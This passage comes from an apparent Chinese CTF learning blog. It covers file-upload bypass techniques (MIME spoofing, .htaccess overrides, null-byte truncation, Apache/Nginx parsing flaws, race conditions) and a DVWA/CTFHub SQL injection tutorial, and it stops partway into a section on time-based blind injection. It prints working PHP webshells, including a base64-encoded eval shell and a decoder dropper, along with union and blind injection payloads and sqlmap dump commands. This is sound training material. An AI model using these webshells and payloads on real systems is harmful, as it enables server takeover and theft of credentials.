———WebKitFormBoundaryxxx 隔开，boundary是一个字符串，用来切分数据。</p><p>这里就和 post 请求一样，可以自己增加参数，就形如下面这样，将参数名放到 name 里，参数值放到下面：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary1PkqXeou9aUAIMHr</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">1.php</span><br></pre></td></tr></table></figure></div><p>那么这里就增加了一个参数 filename &#x3D; ‘1.php’</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.对于上传文件的后缀名（扩展名）没有做较为严格的限制</span><br><span class="line">2.对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</span><br><span class="line">3.权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</span><br><span class="line">4.对于web server对于上传文件或者指定目录的行为没有做限制</span><br></pre></td></tr></table></figure></div><h1 id="常见Bypass"><a href="#常见Bypass" class="headerlink" title="常见Bypass"></a>常见Bypass</h1><h2 id="前端检测-JS验证"><a href="#前端检测-JS验证" class="headerlink" title="前端检测-JS验证"></a>前端检测-JS验证</h2><p>前端对上传文件后缀进行检查，常见js代码</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="抓包修改后缀绕过"><a href="#抓包修改后缀绕过" class="headerlink" title="抓包修改后缀绕过"></a>抓包修改后缀绕过</h4><p>先上传符合题目要求的后缀名文件，可以是php一句话木马文件改成的图片马</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4ne6y4387j21f20pewke.jpg"                      alt="image-20220729062458268"                ><figcaption>image-20220729062458268</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4ne85hp8ej218e0nw0y7.jpg"                      alt="image-20220729062608013"                ><figcaption>image-20220729062608013</figcaption></figure></p><p>修改完点击forward，到服务器后端发现成功上传成php文件</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4ne98rphnj20qg0be74p.jpg"                      alt="image-20220729062711209"                ><figcaption>image-20220729062711209</figcaption></figure></p><h4 id="其他绕过方式："><a href="#其他绕过方式：" class="headerlink" title="其他绕过方式："></a>其他绕过方式：</h4><p>1.在控制台重新定义函数 <code>function checkFile()&#123;&#125;</code> 回车即可(<strong>注：需要在未触发该函数前</strong>)</p><p>2.F12打开控制台，选择关闭JavaScript</p><h2 id="后端白名单绕过"><a href="#后端白名单绕过" class="headerlink" title="后端白名单绕过"></a>后端白名单绕过</h2><h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p>在传输过程中标记文件类型的一种方法，也就是 HTTP 文件请求头中的 Content-Type </p><h3 id="常见源码"><a href="#常见源码" class="headerlink" title="常见源码"></a>常见源码</h3><p>白名单检测</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>))</span><br></pre></td></tr></table></figure></div><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>bp抓包，上传php木马，而后修改Content-Type 为题目要求，也可尝试再将上面的Content-Type的multipart&#x2F;form-data 第一个字符 m 改成 M，即 Multipart&#x2F;form-data（不影响传输） </p><blockquote><p>大写 Multipart绕过同样也要改</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4neyl8061j21940pq7ak.jpg"                      alt="image-20220729065132723"                ><figcaption>image-20220729065132723</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4neyhl0plj21940pq7ak.jpg"                      alt="image-20220729065127148"                ><figcaption>image-20220729065127148</figcaption></figure></p><h3 id="00截断-1（GET-POST）"><a href="#00截断-1（GET-POST）" class="headerlink" title="00截断-1（GET|POST）"></a>00截断-1（GET|POST）</h3><p><a class="link"   href="https://tatsumaki.cn/2020/07/29/00jieduan/" >关于上传中00截断的理解与分析 | Tatsumaki’Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>要求GPC处于关闭状态，且php版本小于5.3.29才可利用</p><p>在数据包中，含有上传后文件目录的情况才可使用。比如在数据包中存在path：&#x2F;uploads&#x2F;</p><p>这样一来，程序提取后缀名的时候就会合法，然后拼接路径与文件名。这个时候的拼接结果应该就是：&#x2F;uploads&#x2F;1.php%00&#x2F;xxxxxxxx.php</p><p>于是移动文件的时候，就会把00后面的东西视作不存在，结果就变成了&#x2F;uploads&#x2F;1.php，从而getshell。</p><blockquote><p>path在url、cookie或者上传方式不是multipart&#x2F;from-data的时候，就不用进行url编码</p></blockquote><h2 id="后端黑名单绕过"><a href="#后端黑名单绕过" class="headerlink" title="后端黑名单绕过"></a>后端黑名单绕过</h2><h3 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h3><p>黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。<br>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</p><h3 id="htaccess利用"><a href="#htaccess利用" class="headerlink" title=".htaccess利用"></a>.htaccess利用</h3><p>原理： </p><ol><li>.htaccess 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。</li></ol><p>2.htaccess 中有 # 单行注释符, 且支持 \拼接上下两行。</p><h4 id="上传-htaccess文件内容为"><a href="#上传-htaccess文件内容为" class="headerlink" title="上传.htaccess文件内容为"></a>上传.htaccess文件内容为</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt; </span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>将上传的1.jpg文件按php文件执行</p><p>SetHandler指令可以强制所有匹配的文件被一个指定的处理器处理。</p></blockquote><blockquote><p>.htaccess总结</p><p>1.htaccess文件使用要开启apache httpd.config AllowOverride All 而且要重启服务才能生效 和<strong>LoadModule rewrite_module modules&#x2F;mod_rewrite.so 没关系</strong></p><p>2.集成环境简单但是不安全所有的安全配置都是开启的，原始平台安装配置稍复杂但是安全系数高配置都是默认关闭的，而且一般集成环境拿到的shell基本上是最高权限</p><p><strong>3.上传使用.htaccess文件如果碰到是黑名单处理并且是集成环境搭建的环境那就又很大的可能绕过验证getshell，不是的话就只能凭运气看站长是否开启了AllowOverride All</strong></p></blockquote><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>window对大小写不敏感，linux对大小写敏感</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.Php</span><br></pre></td></tr></table></figure></div><blockquote><p>黑名单替换要注意替换字符，如果替换成空字符串，则可以双写绕过，如果替换成空格或其他字符，则要放弃双写思路，尝试大小写绕过</p></blockquote><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$$DATA绕过"></a>::$$DATA绕过</h3><p>利用NTFS文件流特性</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4nzrueqfhj210s0eomz3.jpg"                      alt="image-20220729185140457"                ><figcaption>image-20220729185140457</figcaption></figure></p><blockquote><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p></blockquote><h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><p>windows等系统默认删除文件后缀的.和空格，查看网站源码发现，没有过滤点</p><h2 id="配合解析漏洞"><a href="#配合解析漏洞" class="headerlink" title="配合解析漏洞"></a>配合解析漏洞</h2><h3 id="Apache-HTTPD换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD换行解析漏洞（CVE-2017-15715）</h3><p>在2.4.0~2.4.29版本存在一个解析漏洞，在解析php时，<strong>1.php\x0A</strong>将按照<strong>php</strong>后缀进行解析，导致绕过一些服务器的安全策略</p><ul><li>上传一个包含换行符的文件。注意，只能是<code>\x0A</code>，不能是<code>\x0D\x0A</code>，所以我们用hex功能在1.php后面添加一个<code>\x0A</code></li><li>然后访问<code>/1.php%0A</code>，即可发现已经成功getshell</li></ul><blockquote><ul><li><p>获取文件名时不能用<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>，因为他会自动把换行去掉，这一点有点鸡肋</p></li><li><p>默认的Apache配置即可利用，因为默认Apache配置就使用了<code>&lt;FileMatch&gt;</code>：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div></li></ul><p><strong>所以理论上，只要用正则来匹配后缀进行php解析的Apache就有这个问题。而这个做法刚好是为了解决<a class="link"   href="https://github.com/vulhub/vulhub/tree/master/httpd/apache_parsing_vulnerability" >Apache老的解析漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>而做的，可谓非此即彼，必然存在一种解析漏洞。</strong></p></blockquote><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a><strong>Nginx 解析漏洞</strong></h3><p>由于nginx.conf的如下配置导致nginx把以’.php’结尾的文件交给fastcgi处理,对于任意文件名，在后面添加&#x2F;xxx.php（xxx）为任意字符后，即可将文件作为php解析。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传shell.jpg</span><br><span class="line">访问shell.jpg/.php    会按照shell.php执行</span><br></pre></td></tr></table></figure></div><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><p>当文件上传到服务器，白名单进行的文件头检测。<br>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638</p><blockquote><p>png有时会加入HIDR头检测，主要标志是getimagesize函数</p></blockquote><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），处理后在放到网站对应的标签进行显示。</p><p>如何绕过呢<br>1.将一句话插入网站二次处理的图片，把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。</p><blockquote><p>选择gif文件成功率大，出现无变化片段大几率大</p></blockquote><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>条件竞争为特别漏洞，是文件上传进行验证的短暂时间内。对传入的文件进行了临时保存，可能是一秒，也可能是0.几秒。但在这短暂时间内php是可以解析的，如果解析的速度够快。</p><p>绕过：<br>上传1.php文件，利用bp抓包，设置多线程，不断发包。浏览器访问连接我们上传的1.php文件。不断刷新，会在某瞬间，执行1.php成功。</p><h2 id="危险函数检测"><a href="#危险函数检测" class="headerlink" title="危险函数检测"></a>危险函数检测</h2><p>一般为waf对上传文件的内容进行检测</p><p>1.使用动态调用绕过，例如：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_GET[&#x27;0&#x27;]($_GET[&#x27;1&#x27;]);?&gt;</span><br><span class="line">此方法不能绕过disable_function</span><br><span class="line">12</span><br></pre></td></tr></table></figure></div><p>2.上传编码后的webshell配合.htaccess来解析</p><p>3.上传编码后的webshell，再另外上传一个脚本文件解码webshell并写入新文件，例如下面这段代码为1.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div><p>上传后再上传下面为2.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$path =&quot;/xx/xxx/xx/1.php&quot;;</span><br><span class="line"></span><br><span class="line">$str= file_get_contents($path);</span><br><span class="line"></span><br><span class="line">$strs = base64_decode($str);</span><br><span class="line"></span><br><span class="line">$test = fopen(&quot;./test.php&quot;,&quot;w&quot;);test</span><br><span class="line">test</span><br><span class="line">fwrite($test,$strs);</span><br><span class="line">fclose($test);</span><br><span class="line">?&gt;</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure></div><p>然后访问后再访问test.php即可getshell</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入学习</title>
      <link href="/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>SQL注入是指在判断出注入点后，将<strong>恶意的SQL语句</strong>添加到输入参数中，使得后台服务器<u>执行添加的SQL语句</u>，从而达到窃取网站敏感信息等目的</p><h2 id="二、实例及原理"><a href="#二、实例及原理" class="headerlink" title="二、实例及原理"></a>二、实例及原理</h2><h3 id="2-1字符型注入-dvwa平台sql注入简单级别"><a href="#2-1字符型注入-dvwa平台sql注入简单级别" class="headerlink" title="2.1字符型注入(dvwa平台sql注入简单级别)"></a>2.1字符型注入(dvwa平台sql注入简单级别)</h3><h4 id="查看回显"><a href="#查看回显" class="headerlink" title="查看回显"></a>查看回显</h4><p>输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221760.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><ul><li>发现主要执行的SQL语句为:</li></ul><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure></div><blockquote><p>类似这类传入参数以<code>&#39;</code>包裹的称为字符型注入，可以通过传入 <code>1&#39; xxx#</code>(xxx为恶意的SQL语句)的方式来执行恶意的SQL语句<br><strong>原因</strong>:</p><ul><li>数字后跟的<code>&#39;</code>与源码中$id前的<code>&#39;</code>优先匹配，后面的SQL语句只要用union与前面的SELECT语句连接，就可以做到让后台服务器执行能达到攻击目的的SQL语句。</li><li>最后的<code>#</code>作用是将语句结尾的<code>&#39;</code>和<code>;</code>注释掉，将<code>&#39;</code>注释掉是为了防止语法错误，并且对于单句SQL语句即使没有<code>;</code>也可以正常执行</li></ul></blockquote><ul><li>回显部分的代码为:</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Get values</span></span><br><span class="line">    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br/&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br/&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>由于使用while循环，可以猜想到如果执行的SQL语句union上别的SQL语句(联合查询)，只要查询的字段数和类型相同，每一行的数据都可以被回显出来</p></blockquote><h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>SQL语言中<code>order by</code>关键字用于给查询的表添加排序条件并且处于SELECT语句末尾，正常情况下我们并不知道查询结果的字段名，但可以在<code>order by</code>后直接跟数字1表示按第一字段排序，用此方式发现在输入 <code>1&#39; and order by 3#</code>时发生错误，因此得知查询结果总列数为2,这表示之后union 后的select语句仅仅只能查询<strong>两个字段</strong><br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221721.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h4 id="获取库名、表名、字段名"><a href="#获取库名、表名、字段名" class="headerlink" title="获取库名、表名、字段名"></a>获取库名、表名、字段名</h4><ul><li>获取库名,要想获取关键信息，得知道库名、表名、字段名，利用user()和database()函数分别获取用户名和数据库名称<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221259.png"                      alt="1"                ><figcaption>1</figcaption></figure></li></ul><blockquote><p>由于该情景下union后的select语句必须有两个字段，这里主要获取数据库名称，user()可以替换成其他函数或者常量等等都可以</p><h3 id="获取所有库名"><a href="#获取所有库名" class="headerlink" title="获取所有库名"></a>获取所有库名</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> group_concat(schema_name) <span class="keyword">FROM</span> information_schema.schemata</span><br></pre></td></tr></table></figure></div></blockquote><ul><li>获取表名,这边需要了解到<code>information_schema</code>是mysql自带的数据库，其中名为<code>tables</code>的表中的两个字段<code>table_name</code>和<code>table_schema</code>记录了DBMS中的存储的表名和表名所在的数据库。现在我们已经知道了数据库名称为<code>dvwa</code>，可以加入WHERE进行条件查询,最终后台服务器运行的SQL语句为:</li></ul><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> table_name, table_schema <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span> <span class="string">&#x27;dvwa&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>得到表名有两个，分别为<code>guestbook</code>和 <code>users</code>，根据经验判断网站敏感信息存储在users表中</p></blockquote><ul><li><p>获取字段名，<code>information_schema</code>中有一张名为<code>columns</code>的表，其中<code>column_name</code>存储了字段名，通过增加条件<code>table_name = &#39;users&#39;</code>，成功获取<code>users</code>表的字段名<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221711.png"                      alt="1"                ><figcaption>1</figcaption></figure></p></li><li><p><strong>获取敏感信息</strong>: 从字段名可看出，user和password存储着重要信息，添加<code>select user, password from dvwa.users</code> 即可得到账号及密码，密码使用了md5加密<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221287.png"                      alt="1"                ><figcaption>1</figcaption></figure></p></li></ul><h3 id="2-2-整数型注入-CTFHub技能树"><a href="#2-2-整数型注入-CTFHub技能树" class="headerlink" title="2.2 整数型注入(CTFHub技能树)"></a>2.2 整数型注入(CTFHub技能树)</h3><ul><li>输入1，由下方红字提示输入的内容没有被<code>&#39;</code>包裹，这种称为整数型输入，输入<code>1 and 1=2</code>没有回显也可以验证这是整数型注入，因为如果是字符型，字符串’1 and 1&#x3D;2’自动转换成整数1，仍有回显<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221732.png"                      alt="1"                ><figcaption>1</figcaption></figure></li></ul><blockquote><p>SQL中字符串自动转换成整型规律：从左边第一个字符开始排查起，转换成出现的第一个非数字字符前的数字对应的整型，如果第一个字符就不是数字，则转换成0</p></blockquote><ul><li>继续使用同字符型注入同样的方法，<strong>判断完列数后</strong>在输入的ID后跟上union语句,发现回显仍为id为1的信息，原因猜测是该网页只会回显查询结果的第一行，因此要实现让前一个select语句查询结果为空，可以让其WHERE后跟的条件始终为加，如：<code>1 and 1=2</code><br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032221925.png"                      alt="1"                ><figcaption>1</figcaption></figure></li><li>剩下的同字符型注入一样的流程：得到数据库名、表名、字段名，需要注意的是，查询结果只返回一行，为了防止查询结果有多行无法显示完全，使用<code>group_concat(字段名)</code>函数，将所有行综合为一行输出，最终得到flag<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032222504.png"                      alt="1"                ><figcaption>1</figcaption></figure></li></ul><h3 id="2-3-SQL盲注"><a href="#2-3-SQL盲注" class="headerlink" title="2.3 SQL盲注"></a>2.3 SQL盲注</h3><p>盲注指SQL语句执行查询后，查询数据不能回显到前端页面中</p><h4 id="可能需要用到的函数、关键字"><a href="#可能需要用到的函数、关键字" class="headerlink" title="可能需要用到的函数、关键字"></a>可能需要用到的函数、关键字</h4><ul><li>substr(字符串,索引开始位,索引结束位):用于获取字符串中的特定字符</li><li><code>limit 开始行数的索引,显示的总行数</code>:放在select查询语句最后,限制显示行数,索引从0开始</li><li>ascii(字符):将某个字符转换为ascii值</li><li>ord(str)：函数返回字符串str的最左边字符的ASCII码值</li></ul><h4 id="布尔盲注-字符型为例"><a href="#布尔盲注-字符型为例" class="headerlink" title="布尔盲注(字符型为例)"></a>布尔盲注(字符型为例)</h4><p>适用于回显只有两种的情况，如<code>User ID exists in the database.</code>和<code>User ID is MISSING from the database.</code>分别对应了输入语句返回的布尔值。</p><ul><li>如果采用手动注入，一般要结合二分查找、穷举法等方法来逐一破解出库、表、字段的名称。(以下为猜解数据库名称的例子)</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="title function_">count</span><span class="params">(schema_name)</span> from information_schema.schemata)&gt; n # <span class="comment">//猜解数据库个数</span></span><br><span class="line">1&#x27; and <span class="title function_">length</span><span class="params">(database())</span>=n # <span class="comment">//n为大于1的整数,猜解数据库名称长度</span></span><br><span class="line"><span class="number">1&#x27;</span> <span class="keyword">union</span> select <span class="title function_">ascii</span><span class="params">(substr((select schema_name from information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))</span>)&gt;n # <span class="comment">//n为大小写字母对应的ASCII码值，此处需借用二分查找来逐一确定每一个数据库的名称</span></span><br></pre></td></tr></table></figure></div><ul><li>可以借用sqlmap工具来自动化实现这种机器的过程，mac下具体指令为</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch --dbs  <span class="comment">//获取数据库名称,batch意思为不询问输入默认输入Y</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 --tables <span class="comment">//获取表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 --columns <span class="comment">//获取字段名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 -C 字段名 --dump <span class="comment">//获取字段内存储信息</span></span><br></pre></td></tr></table></figure></div><p>最终得到flag<br><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032222451.png"                      alt="1"                ><figcaption>1</figcaption></figure></p><h4 id="时间盲注-字符型为例"><a href="#时间盲注-字符型为例" class="headerlink" 